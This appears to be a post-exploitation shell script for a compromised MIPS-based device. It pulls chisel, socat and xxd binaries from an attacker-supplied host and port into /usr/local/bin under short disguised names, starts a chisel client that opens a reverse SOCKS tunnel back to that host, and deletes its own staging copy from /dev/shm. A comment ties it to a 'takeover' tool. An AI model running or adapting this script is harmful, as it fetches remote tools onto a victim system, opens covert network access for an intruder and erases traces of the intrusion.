#!/bin/sh

FILEPATH=srv
OUT_PATH=/usr/local/bin
CHISEL_BIN=chisel-mips32
SOCAT_BIN=socat-mips32
XXD_BIN=xxd-mips32

CHISEL_OUT_BIN=ch
SOCAT_OUT_BIN=so
XXD_OUT_BIN=x


mkdir -p ${OUT_PATH}
curl http://${1}:${2}/${FILEPATH}/${CHISEL_BIN} -o ${OUT_PATH}/${CHISEL_OUT_BIN}
curl http://${1}:${2}/${FILEPATH}/${SOCAT_BIN} -o ${OUT_PATH}/${SOCAT_OUT_BIN}
curl http://${1}:${2}/${FILEPATH}/${XXD_BIN} -o ${OUT_PATH}/${XXD_OUT_BIN}
curl -X QUIT http://${1}:${2}

chmod +x ${OUT_PATH}/${CHISEL_OUT_BIN}
chmod +x ${OUT_PATH}/${SOCAT_OUT_BIN}
chmod +x ${OUT_PATH}/${XXD_OUT_BIN}

# This sleep is just here until chisel is integrated into takeover
sleep 3

${OUT_PATH}/${CHISEL_OUT_BIN} client ${1}:${2} R:socks &

rm /dev/shm/prep.sh





